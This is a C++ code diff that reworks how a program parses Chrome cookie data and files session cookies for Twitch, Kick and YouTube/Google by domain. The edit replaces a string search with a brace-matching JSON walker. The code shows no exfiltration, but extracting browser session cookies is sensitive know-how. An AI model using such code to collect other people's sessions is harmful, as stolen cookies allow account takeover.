@@ -60,24 +60,38 @@ static void IndexCookies(ChromeSession& s) {
         };
         if (has("twitch.tv")) s.twitch[c.name] = c.value;
         if (has("kick.com"))  s.kick[c.name] = c.value;
-        if (has("youtube.com") || has("google.com") || has("youtube.com"))
+        if (has("youtube.com") || has("google.com"))
             s.youtube[c.name] = c.value;
     }
 }
 
 static void ParseCookieBlob(const std::string& reply, ChromeSession& out) {
-    std::size_t pos = 0;
-    for (;;) {
-        auto npos = reply.find("\"name\"", pos);
-        if (npos == std::string::npos) break;
-        auto chunk = reply.substr(npos, 500);
-        ChromeCookie c;
-        c.name = json::ExtractString(chunk, "name");
-        c.value = json::ExtractString(chunk, "value");
-        c.domain = json::ExtractString(chunk, "domain");
-        if (!c.name.empty()) out.cookies.push_back(c);
-        pos = npos + 6;
-        if (out.cookies.size() > 8000) break;
+    int brace = 0;
+    std::size_t obj_start = std::string::npos;
+    bool in_str = false, esc = false;
+    for (std::size_t i = 0; i < reply.size(); ++i) {
+        char ch = reply[i];
+        if (esc) { esc = false; continue; }
+        if (ch == '\\' && in_str) { esc = true; continue; }
+        if (ch == '"') { in_str = !in_str; continue; }
+        if (in_str) continue;
+        if (ch == '{') {
+            if (brace == 1) obj_start = i;
+            ++brace;
+        } else if (ch == '}') {
+            --brace;
+            if (brace == 1 && obj_start != std::string::npos) {
+                std::string obj = reply.substr(obj_start, i - obj_start + 1);
+                ChromeCookie c;
+                c.name   = json::ExtractString(obj, "name");
+                c.value  = json::ExtractString(obj, "value");
+                c.domain = json::ExtractString(obj, "domain");
+                if (!c.name.empty() && !c.domain.empty())
+                    out.cookies.push_back(std::move(c));
+                obj_start = std::string::npos;
+                if (out.cookies.size() >= 8000) break;
+            }
+        }
     }
 }
 
